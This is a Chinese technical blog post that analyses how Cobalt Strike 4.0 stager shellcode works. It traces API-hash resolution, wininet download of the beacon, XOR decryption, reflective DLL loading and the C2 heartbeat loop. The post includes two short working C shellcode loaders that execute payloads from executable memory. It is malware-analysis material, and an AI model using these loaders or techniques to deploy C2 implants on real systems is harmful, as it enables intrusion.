0x01 本文主要内容
===========

本文主要对cobaltstrike4.0中shellcode的运作原理的分析。

0x02 Cobaltstirke 4.0 shellcode分析
=================================

一、shellcode生成
-------------

Cobaltstrike启动服务端，然后打开aggressor 端，如下图生成payload：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9705c476316e658e60c291ba0d331f9116abddd1.png)  
打开生成的payload：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8815e803669794e97cb35479501528e7e7e7b079.png)

长度是1600个byte

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-67a8ae4c147d32064483286ab755d7d8b93acb8f.png)

创建一个加载这个段机器码的加载器，在cobaltstrike中这段机器码我们一般叫stager，所以我们简单写一个stagerloader:

二、shellcodeloader
-----------------

这里实现的方法很多，可以直接通过c++内联汇编，获取shellcode的存储地址，然后直接跳转过去；也可以分配内存空间，将对应payload当成一个返回类型为void的函数来执行。如下图，也是比较常见的c实现的loader的形式：

```php
#include   
​  
int main(void) {  
    unsigned char buf\[\] = 上面那串payload；;  
    //创建一个堆（这里看个人习惯，不建堆也可以直接分配）  
    HANDLE myHeap = HeapCreate(HEAP\_CREATE\_ENABLE\_EXECUTE, 0, 0);  
    //从堆上分配一块内存  
    void\* exec = HeapAlloc(myHeap, HEAP\_ZERO\_MEMORY, sizeof(buf));  
    //payload复制过去  
    memcpy(exec, buf, sizeof(buf));  
    //将exec强制转换成返回类型为void的函数指针，并调用这个函数  
    ((void(\*)())exec)();  
    return 0;  
}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7a0667c9e5201822fb8eba61cc53e56636bc98d7.png)

编译链接生成exe，（使用vs编译链接的时候建议把什么优化，安全检查，随机基址，以及相关清单信息啥的都关掉，方便后面我们对exe进行调试）

通过x86 的release生成的exe如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8d62b98e3a1d0d1206ca5a6d62f92b7eea3e8d86.png)

完成之后我们先简单测试下，丢到虚拟机运行下，看下上线啥的是否正常:

如下图，没啥问题，成功上线：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-bc09ca1b84f9f8ac073e9734dc17d64156ea965b.png)

接下来我们使用ollydbg来调试下这个exe，来看看这个payload在执行什么内容：

od运行之后，一个call和一个jmp：使用这个编译器生成好像都是这样，不重要，我们要找的代码在jmp里面，跟过去就行了

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-baf48e7486bd0c100a9dde93cbb875fdf1001ce5.png)

过来之后又是一堆操作，调用啥的,代码还挺长：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7d6524555d00117a5254492121f5463c71b14843.png)

一个个过肯定是能找到执行我们payload的调用的，过的方法呢，就看过完对应call之后，aggressor端是否新增上线设备就行。但是这里有简单方法，比如给heapAlloc上调试断点，f9，就直接跳过去了。

最后是在这个call里面调用了对应的payoad：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-5261874e0776b6eda07f2093110cc498d6b7245b.png)

f7进去看看，如下图，就是我们自己写的代码了：其中的四步内容如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f806cd12d5c8f9bce1f9d217a696e2ede1898c72.png)

三、shellcode分析
-------------

### 1、第一阶段（stager）

直接跟进去调用的payload：如下图，就是我们生成的payload：（从这里开始往下，因为笔者调试的是多是多次进行运行，所以每次分配的堆的内存空间不一样，比如下图是9805c8开始，下下下下张图（从下开始第四张）是9c05c8开始，所以这里我们主要看代码逻辑即可，地址可能对不上，笔者尽量在完整的一段逻辑里面分析的时候一次过）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3b0ba691eb948a5269a94cd64206ab8b59e94a55.png)

第一个call:

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-e05f1f441f039f3fa9ee910b9e7187efeb21a42b.png)  
和上图call配合，这里pop ebp，获取到eip，如下图然后压入特征码和参数返回eip：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-89d8cb0fcfed032ab537e97667d27006a4bba87d.png)

上图中，其中参数有，“wininet”，和一个特征码 726774c，然后通过call ebp 返回。

如下图，返回之后通过fs寄存器，找打TEB——&gt;PEB——&gt;PEB\_LDR\_DATA——&gt;内存模块加载List（InMemoryOrderLinks）——\_LDR\_DATA\_TABLE\_ENTRY

——&gt;获取模块的名称和基址，为后续遍历模块和函数名做准备。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-66a6cfce70c40323f08146338a1d23d6fb34f644.png)

然后对获取的模块名，对其进行特定的一个hash算法，如下图：第一个获取到的模块名是，exe本身这个模块，所以模块名是：“shellcodeloader.exe”

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-634cc55e6fb0904a94f741bbb1f59fa8399df72c.png)

对其进行特定的求特征算法，（算法逻辑就是：对每个字符判断，如果大于0x60，就减0x20（其实就是小写转大写），然后累加，在累加前将上一次的累加结果循环右移14位）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-1a45a4427f6f200e1682b76894aa57c1aaee730c.png)

最后得出来的值是在edi中，将其压入栈中，后面会使用到。

然后找到edx+10 对应位置：如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3afd02da4be253a379d84ac3109f9625ef154a47.png)

这个位置其实就是，\_LDR\_DATA\_TABLE\_ENTRY中的0x18偏移的内容（edx是头指针，在里面的0x08偏移的位置），下表是该结构体的内容，所以这里其实就是拿到对应的模块的基址

```php
struct \_LDR\_DATA\_TABLE\_ENTRY  
{  
    struct \_LIST\_ENTRY InLoadOrderLinks;           //0x0               
    struct \_LIST\_ENTRY InMemoryOrderLinks;            //0x8  
    struct \_LIST\_ENTRY InInitializationOrderLinks;   //0x10                
    VOID\* DllBase;                           //0x18                                 
    VOID\* EntryPoint;                      //0x1c                                   
    ULONG SizeOfImage;                  //0x20                                      
    struct \_UNICODE\_STRING FullDllName;     //0x24                                
    struct \_UNICODE\_STRING BaseDllName;      //0x2c                                 
    ....  
};
```

拿到基址之后，如下，寻找3c偏移，这里是在DOS头3c偏移找PE起始位置，然后找pe头中的78偏移。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-376233f436e3ca02c390ebf39a5bd0663e834f94.png)

PE头中的0x78偏移：如下，可以看到这个位置其实就是可选头里面的导出表

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-da49fe0285a52e6f39db61aeb34b166e1e52dd0f.png)

找到导出表之后，接下来的test命令，判断是否为0，也就是判断这里是否有导出表：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-879f55d811b3c1e46e9cd0c81a05e3ccf2bedba5.png)

等于0的话，来到如下，这里我们第一次运行的时候也的确等于0，因为我们的exe里面没有导出表，下面的对导出表为空的处理其实就是接着遍历下一个模块，然后跳回到获取模块名的位置：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-12f0f2f4249d4adaf76246da03edd1968fa6cb6a.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-14dedaf7ca540093e692cef9b6c4a54a56cbde41.png)

接着我们去看看当某个模块的导入表不为空的时候，怎么处理的，其实第二个模块就是ntdll.dll （一般程序第三个是kernel32.dll），此时就满足导出表不为空，

然后其操作是：找到导出表里面的0x18偏移和0x20偏移的地方，这个表的结构如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-de4ceae36dfcba617990a84f8dbef34e974c51e5.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-21cf0bfa1791dd2153f24f5e18171832f59ea2a5.png)

然后如下图，遍历名称，计算特征值（这里的计算算法和之前对模块的特征算法有点不一样，区别就是没有判断是否是大于0x60,然后小写转大写），和之前栈中的特征码比较：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-95ac3b64c4714cad8f32d1bdf9b9f66ad122008b.png)

如下图：拿计算出来模块的特征值加上函数的特征值，最后和我们在开头压入栈中的特征值做比较：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7b2ae8c05f5fde3886dde66395ada653c044fb47.png)

如果不相等：就遍历下一个函数，一直到这个模块的全部以名称形式导出的函数被遍历完，然后重复遍历下一个模块：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8ee47edf2e2586fd40a76bd1031e6b37bfa08126.png)

这里我们来看下，当找到对应的函数，其通过这种hash算法计算出来的值和压入栈中的相等时的情况，

1、这个函数是什么函数

2、对这个函数干什么

如下图，可以看到，当我们遍历到，kernel32.dll模块里面的LoadLibraryExA函数的时候，特征码就相等了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ab8d0b86493f2a5844f0cd6040f483ab47c67ea9.png)

如下图是干了什么，这里面一顿操作，通过循环次数获取在其导出序号表里面获取到导出序号，然后利用导出序号在导出地址表里面获取到其导出地址，之后就可以随便调用LoadLibraryExA：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-1b0448154879d7bed630427ffed30a4f73f47509.png)

如下是，获取到之后的动作，利用这个函数，来加载wininet这个dll：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-e2ac69e96438fce9401c822a25f8aed412927d3f.png)

试想为什么要加载这个dll，其实大概能猜出来，肯定是后面用的函数载这个wininet这个dll模块里面，而本身的程序里面没有加载这个模块。

我们继续往下看：之后就是使用相同的方式，传入对应的特征码，然后循环遍历模块去找函数，这里其实大概率下面的这些函数都载wininet这个dll里面：

大概看了下是如下的9个函数，根据对应特征码，使用同样的方法获取到对应函数的地址，并通过压入堆栈的数据作为参数并调用对应函数：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-634ac2a234f29a75ed6f1da7dfc0e6329ff00dcd.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-21ed1806103055204e28c8ca7d2d17d0c18cd5fb.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-6cf62e826c45a2336cca207341ebda64eb5eb035.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4d25627ac734d96290f8b79b3e73ffe74cec8f99.png)

简单看下这些函数是什么：

第一个：A779563A对应的是wininet里面的InternetOpenA函数

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c7e729e6ea560a87af3876aede1f95c43c1a480f.png)

第二个：C69F8957对应的wininet里面的InternetConnectA

第三个：3B2E55EB对应的wininet里面的HttpOpenrequestA

第四个：7B18062D对应的是wininet里面的HttpSendRequestA

第五个：315E2145对应的是user32里面的GetDesktopWindow

第六个：0BE057B7对应的是wininet里面的InternetErrorDlg

第七个：E553A458对应的是kernel32里面的VirtualAlloc

第八个：E2899612对应的是wininet里面的InternetReadFile

这里面的逻辑，就是建立和cobaltstrike server的链接，然后发送get请求，开辟内容空降将返回的内容存起来，最后运行对应返回的内容，（上述这个步骤就是我们说的通过stager拉取beacon的操作）

### 2、第二阶段（解密beacon中的PE文件）

如下是来到了返回的内容：其实这里就是cobaltstrike里面的beacon了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a157d737c0b0d03882783d68cf95f8d5f638c4cd.png)

在流量侧我们看到的是：MDwT是符合checkSum8算法（cs里面对uri资源判断的一个算法，详情可参考笔者[另一篇文章](https://forum.butian.net/share/1861)）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-b3bb0a39034f077812277274f2f345b2313c6394.png)

接下来我们进入beacon的内容来看这里面干了什么：如下图：beacon里面上来就是实现了一个解密操作，将46偏移之后内容通过和一个固定的3d偏移的内容，以4字节为单位做异或，还原对应内容。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9d133646632773b093a8f5ee88a712717c49ddb3.png)

还原的长度是：0x33000

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-694bc86e6c886dc0b2a674cca7fa728b7e3a204b.png)

内存中没解密之前的数据是这样的：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-6d58efb1495e7a31b4f256f0781285c25c9a0d30.png)

解密之后：稍微留心就会发现这个解密之后的内容其实就是一个PE文件，开头是4D5A，下面的是Dos引导区，再后面13D偏移的位置还有PE头：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-1efbb38b5643e3379c2ca44abf0cb0cb9e11f127.png)

### 3、第三阶段（通过PE头部引导，运行beacon解密出来的PE文件中的reflectiveloader函数）

继续往下看，发现通过一个pop edi，jmp edi， 直接跳到了 刚刚还原出来的数据 45偏移的位置开始执行：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a088b90d38a0e7d14346a51afe82185ef609bdb6.png)

这里就比较奇怪了，明明是个PE文件结构的内容，为啥beacon直接把这个当shellcode去运行执行了，就强行将jmp过去，从pe的头开始执行。

嗯，笔者之前写过[一篇文章是记录一次对Cobaltstrike powershell 上线的分析](https://forum.butian.net/share/1934)，当时笔者也是遇到了这个问题，powershell上线的时候也是莫名其妙的构造了一个shellcodeloader，然后把dll文件丢到loader里面，具体为什么这样做，感兴趣可以看下那篇文章。

这里也不绕圈子了，其实就是利用反射dll修复技术，一般我们称其为Reflective DLL Injection技术，是由研究员 Stephen Fewer 再2009年提出的，后续在15年

加入了一些shellcode 技巧和引导程序来完善，发展的较为成熟，应用到恶意软件的中，很多apt组织使用了这个技术，当时基本可以过所有的av，从而大火。

关于这个技术的参考项目：

`https://github.com/stephenfewer/ReflectiveDLLInjection`

之前了解这个技术原理的师傅们可以去看看。

言归正传，我们继续在od中看下这个dll怎么被“执行”的：如下图是跟进之后，发现指令混到一起了

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8694d45d471eb295f07080dc5bbfce46350eb35a.png)

为了方便我们接下来的调试，我们将这个PE文件的内容dump下来：从这个0x29F0045开始，一直到后面没有指令的位置，或者你实在不放心，就dump长度为33000的长度，这个长度是刚刚解密的时候解密内容的长度。  
这里我们手动dump下来就行，选中想要dump的内容，右键——backup——savetofile 就完事了，选中对应内容的时候还有一个小技巧，直接CTRL+G来找头和尾的位置，然后按住Shift 点两下就行了，就把要dump的内容全选了。

dump下来之后如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8821242f73115d9f10ad8d2187229365e9d8bd23.png)

然后我们简单和之前一样，做个简易的loader，做的内容上文有，这里我就不罗嗦了：

如下代码：

```php
​  
#include   
#include   
using namespace std;  
​  
​  
void run()  
{  
    HANDLE hfile = CreateFileA("afterdecryptothingDLL1.mem", FILE\_ALL\_ACCESS, 0, NULL,  
        OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL);  
    LPVOID exec = VirtualAlloc(NULL, 0x4000000, MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);  
    DWORD realRead = 0;  
    ReadFile(hfile, exec, 0x4000000, &amp;realRead, NULL);  
    ((void(\*)())exec)();  
}  
int main() {  
    run();  
}
```

最后生成exe：（运行的时候记得把afterdecryptothingDLL1.mem这个文件放过来）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4ac0e6f3b1efc8847117d7fae8f5c8ee4911835b.png)

首先我们测下，这个有问题没：运行下，如下图没问题，运行之后成功上线

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-51c70f60c450be727d56e2f2be1c553a7c8ce0ca.png)

接着我们使用od对其调试，看下里面干了什么：

前面loader的代码我就不说了，这里我们直接来到强行执行PE的位置：如下图，上来就是一个经典的call pop，找到当前的位置：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-455535c85889d2ac8717cf0f4616a2e5ef7a8d14.png)

然后将位置放到edi里面存着，后面跟了个push edx，和inc ebp ，来还原前面”4d 5a（dec ebp, pop edx）“干的事情：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-d0c4a3f339324ccc2bff3b62a6e615f6d09f1895.png)

然后同push ebp 和 mov ebp，esp，另起一个栈，并将刚刚获取到的真实位置+8150的偏移，刚刚获取到的是这段分配到空间的0007偏移位置的真实地址，所以我们得到的就是这段分配到空间的8157偏移的位置，调用对应位置执行：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c98ab74b5c4cc78670559a6bb9c099abc12039f3.png)

在分析到对应位置之前，我们回过头来看下这个afterdecryptothingDLL1.mem 这个文件，使用PE查看器打开：

可以看到给出的信息是一个dll文件：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-da3e283ed4c1df4216e3671b53832efb12775bdf.png)

导出表：存在一个导出函数：RVA是08d57，对应的文件偏移就是：0x08d57-0x1000+0x400=0x08157，正好就是我们上面要跳往的地址：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f23f2a608a9cb852d269e7ddabc730bad37f4fb2.png)

所以也就是说，接下来就是在执行这个ReflectiveLoader函数：如下图，进来，先通过以下手段，找到PE头部的真实位置

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-1011b81fe9f403f66d12ac053a50388227e6a9f6.png)

然后就是三环fs寄存器那套了：获取到加载模块的名称：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-b12eeb4a1115de1923ede3b7c776acb43b78ffe1.png)

然后计算hash，和特征码作比较：如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-55cffce5f6581673328c41217d14e749e9a88f08.png)

紧接着，不匹配就继续遍历下一个模块，匹配上了的话就获取对应dll的基址：如下图，在struct \_LDR\_DATA\_TABLE\_ENTRY结构中，下面的eax在本身就是在0x08偏移位置，这里加0x10，就变成了0x18，这个位置就是对应模块的基址位置，

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-96a40fa220260be3f1a45d6a040cb414f202fa28.png)

如下图，可以看到这个”6A4ABC5B“特征码找的是kernel32这个模块：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-011d012a929062f0cf2f4ddd3406a66b25b03ee5.png)

接着又是老套路，从基址找到导出表，找到以函数名称导出的函数的个数，找到函数名称导出表INT：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9157037ec908817d578ff0fb68fe9956ca5b8127.png)

接着就是遍历函数名，计算特征码：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ad1b87e293ba95dbb0fc101203923a5a94c37d52.png)

计算出来的特征码，和以下六个特征码比较：其实就是找到下面六个特征码对应的函数，并且这些函数都是在kernel32里面的：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3938d8acb7026a4950e4d2b6e2e16ea78981116e.png)

如果特征码相等，那么就接着获取对应IAT表（导出地址表）对应的导出地址（、这个过程是由 从导出名称表（INT）中获取到循环的次序，从循环的次数到导出序号表获取导出序号，从导出序号到导出地址表（INT）中获取导出地址），存在栈中：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cd7f3a4c65d957e3cf8a536b95ab68b3262f78d5.png)

这些函数是：

GetProcessAddress、GetModuleHandleA、LoadLibraryA、LoadLibraryExA、VirtualAlloc、VirtualProtect

在Reflective dll inject 技术里面，这里的reflectiveloader方法是用来处理这个DLL的，因为我们解密还原出来的dll其实是以“文件形式”存在内存中的，所以这里

reflectiveloader这个函数的主要功能就是：将这个文件形式存在的dll，加载到内存里面，也就是把reflectiveloader这个函数自己所在的dll加载到内存里面。

这里面要经过的过程是：

1、从文件形式到内存形式的拉伸，因为内存对齐和文件对齐是不一样的。这个过程主要过程就是复制，先将文件头复制到新开辟的空间，然后再按区节一个个复制到对应的相对位置。

2、修复导入表，之前以文件格式存储的时候被我们直接复制过来了，此时这里的导入表还是双桥结构，也就是INT（导入名称表）和IAT（导入地址表）是一样的，所以当我们把其加载到内存中的时候，我们要修复IAT表。修复过程就是根据导入名称表遍历导入的模块名称和函数名称，然后利用上面获取到的LoadLibrary函数和GetProcessAddress函数来找到对应函数名称的真实地址。

3、如果有重定位表，修复重定位表（这里肯定是有的，因为后面我们再这个dll的oep 也就是dllmain中还要实现我们c2 client的逻辑，不可能全部用PIC（位置无关代码）来写把），而且这里我们这个dll新加载的位置，是我们新通过virtualalloc开辟的，肯定和这个dll本身的预期的基址（imageaddress）是不一样的，没有加载到指定的基址，那么这里有重定位表，我们就要对其进行修复：

修复重定位表，在PE结构中考虑到重定位表的空间占用问题，重定位表里面并不是，存的一个个需要重定位内容的地址，而是以基址+偏移的方式来存储，几个或者多个偏移位置共用一个基址，从而使空间利用率提高：如下图这种格式：

结构体：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-fb69d43589098e29c6bb767ea8477c3f33174a8e.png)

存储内容的形式：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-5f5da454e43e22dab7e2c9dcdcc353fc1831322d.png)

内存对齐单位使0x1000h,来分页，在重定位表里面也是这样来做的，相同的1页共用一个上面的块结构体，也就是说如果一个pe文件的有8页，并且每页里面多多少少都有需要重定位的内容，那么这里就会有8个上面的块结构。

这里我们简单计算下页里面的大小，0x1000h 也就是说有4096个单位，那么要找到4096个页内偏移的可能呢，需要用几位来标记呢，2的12次就是4096，所以我们只要有12位bit就可以表示这里页内的偏移，pe里面用的2byte 也就是16位bit，其中高4位固定位0011，后12位为偏移位置。

如下是这个dll的重定位表：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8767c98a9f87d9e20d630f557fd61b1383fdb2dc.png)

简单看下对应汇编里面对上述三步的实现：

1、复制数据过：

如下：用virtualAlloc开辟新空间，大小是sizeofimage：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-32c8f63215c2c35393460589fca3463c3f25512e.png)

接着，将整个文件pe头复制过去：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-667500c54b762ac3f0a98a48e086437a195626e1.png)

然后一些判断，如下：判断pe头中的characteristics最低位是否为1：这里就是判断重定位表

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-dd2e7e6c1fa3b88cb2d5961055cc9b7812e3d772.png)

接下来就是循环复制每个节块过去：

如下图，先找到块表：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-84d2666613ebb6deba6b957a49bf3badeceeb1d0.png)

获取块表的相关属性，然后循环复制到新空间：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4219e5e0e1cfc11714f6257858c40f36c65fe6fd.png)  
2、修复导入表：

如下图：这里先找到dll的name

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3132a6f087207fd26626056d90f1d27d2459c71a.png)

然后调用前面获取到的LoadLibrary，加载这个模块：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7d77e8fdec0ea34e6af7200b5af9e36756981a54.png)

然后通过上面获取到的GetProcAddress，找到我们这里在导出表里面遍历的函数的内存地址，然后将内存地址写到其IAT表里面，从而实现导入表的修复：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c77f6b92bfd6877cb16d2bd7ef75286f12cc5bea.png)

3、修复重定位表：

如下图，找到重定位表，根据格式对其每个块里面的内容进行遍历，每个块中存的重定位资源的个数： （块—&gt;size -8 %2），-8是把前面的virtualAddress和size占8个字节干掉，除2，是因为这里我们每个相对偏移占2个字节。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4f245d1e942d47f178c8b9dbb6feb8dba784fc90.png)

如下图，对里面的偏移进行修复

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c3e69b04629d5cd163ac2c11ef0365275b5cc143.png)

最后，如下图：在reflectiveloader这个函数里面，找到这个我们加载进内存dll的EP（入口点），压入参数并调用：这里我们看那个压入的参数”1“，其实就是dllmain里面的fdwReason参数，如下图中第二个红色部分：（但是这里要注意一个小细节，这里的ep并不是dllmain，笔者之前一直以为dll的ep就是dllmain函数，在cs实现的这个dll里面这里调用的是：DllEntryPoint函数，根据这个函数间接调用dllmain函数，并且这两个方法的参数是一样的）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f43ae436d515fb7101571bbdc995979b00f27e41.png)

我们来看下这个DllEntryPoint的实现：如下图，其实就是对fdwReason进行判断，如果等于1，就执行一个A call，然后执行B call；如果不等于1，直接执行Bcall。其实这里的B call就是dllmain， A call是一个\_\_securiyt\_init\_cookie()的函数（这个函数好像用来提供缓冲区溢出保护的，不知道也没关系）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-b23a50d57c093392bbf917d11a0a45e230b7c4d0.png)

接着我们来看下B Call ，也就是dllmain：

dllmain函数的参数：这里我们需要重点注意第二个参数fdwReason：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-971117f870d36e7bb65ad63cfae8e5f2f0d11521.png)

根据msdn上对这个参数的解释：如下图，这个参数为1的时候一般用来做初始化操作：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7bb079c1510e9ae651863b36bc92c53e97f12a94.png)

CS沿用了这一特性，在这里其实也是在做初始化。

我们先不着急跟进对应call 到dllmain中，如下图，可以看到reflectiveLoader函数在下图中的标记的3处中，call下面有一句：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-941c04e7e0914d1bfd169a68f9f54eca184fc792.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-91d0fe47ee46e55bab140d057a7c375f331112ad.png)

这里将这个dll的ep，放到了eax里面，然后后续返回，所以这个dllmain方法就被带出去了，返回之后继续来到PE头部的引导区：如下图：可以看到这里利用eax带回去的地址，继续压入参数并调用，此时压入的fwdReason是4：也就是说又调用了一遍dllmain方法。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-31b83cb4100e59a3fab1f9470a3a4c2ffa1870a4.png)

接下来就是研究这个dllmain方法里面干了啥了，为啥要一共调用两次（一次fdwReason参数是1，一次fdwReason参数是4），等于1的时候是我们上文说到的，第一次是在做初始化吗？

### 4、第四阶段（调用dllmain方法，dllmain方法研究）

来到dllmain方法：如下图，进来就判断fdwReason参数是否等于1，这里也就是第一次调用dllmain，cs其实是在做初始化操作，接下来我们跳转过去看看：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ac8490980383eef070c3937f7abe338f4a2bc8b7.png)

来到跳转后的位置：如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3986fb15baf1e3e0bbd3ca15eff8ef119f3f07c4.png)

跟进到这个call里面：如下图，这个call里面对某块数据进行解密还原：循环的次数是0x1000：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-048774515fdedc394ceecfeb417dd9e7f1e4140e.png)

还原之后的数据如下,其中红色的部分我们是能看出来端倪的，其中包括c2，ua，URI，CT，以及相关心跳传输内容的传输字段（下面这个是Cookie字段）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9838a1f9bdcd1f6fa61106cb9c61a0f74b6199dc.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cbdb127a5472a2aa05a3762095c88d8c9808db21.png)

所以这里这个fwdReason为1的时候的call，其实就是在初始化，将一些被加密的要用的信息还原出来（这个可能是因为beacon生成的时候会受c2profile的配置影响，总不能修改一个c2profile里面的配置，我们就要大费周章的去beacon里面找对应位置做修改把，所以cs对beacon的修改接口就是对这个资源段的修改）。

回过头来，我们来看看dllmain中fwdReason等于4的时候：

一堆逻辑，这里的逻辑代码就不是位置无关代码了，所以我们这里直接反汇编来分析会更加直观简单些，这里我们直接用ida来打开这个dll文件看下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7f7d61cb0cc15fe7a08d5a7de73f298bdc90cd05.png)

找到dllmain函数：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8a645cf7a31064733e0d6aa93192b13771ba83d7.png)

如下图，也就是在8cdf偏移的位置（ida默认基址是10000000）：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-b227b0f534e36dee3f96aca1842e18e1a71c4d2f.png)

直接f5大法：如下图，可以看到其实就是我们分析的对fdwReason进行判断：进行如下逻辑：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-aa2a08a9fea1bd6c3d2a681929ac65e63e352d17.png)

上面通过VirtualQuery获取到这个dll的虚拟空间的一系列页面信息，对获取到的buffer（MEMORY\_BASIC\_INFORMATION 结构），判断其type属性：

type这个属性在msdn上是这么解释的：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-95234c558157e90a4bf688e3fadbc5ad077b3179.png)

所以这里对这个属性做了个判断，为20000的时候释放8000的空间，为40000的时候取消对应dll的映射，笔者这里也不太清除这是要干啥，是检查dll被分配到空间的权限问题吗?

无碍，这个逻辑最后不管这么说，都是去到0x1388这个偏移对应的函数，这个函数就是我们要分析的点，我们简单来看下主要的一些关键位置：

如下是这个偏移函数反汇编后开始的内容：首先获取到和c2通信要用的一些资源和配置，如c2IP、端口、心跳时间，ua等等

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-b9384e085138bf88d0a1c68c88e62e4aa84a93b0.png)

最关键的点是，beacon段要定时发送心跳，并接收返回，对返回的内容进行判断处理，然后做出对应的指令。这里其实就是下面这个死循环：其中1A69偏移的这个函数是在和c2建立连接：（里面就是Wininet里面的InternetOpen，InternetSetOption、InternetConnect）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cbb9e137a998642ad27c8528eaf6af1835200acb.png)

发送心跳请求，如果有就获取响应体内容（通过InternetReadFile获取，cs通信中，如果心跳请求有响应体了，就说明这里在下发任务了）：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-b0a4c6c496a1b3794306d9821946e9972e975824.png)

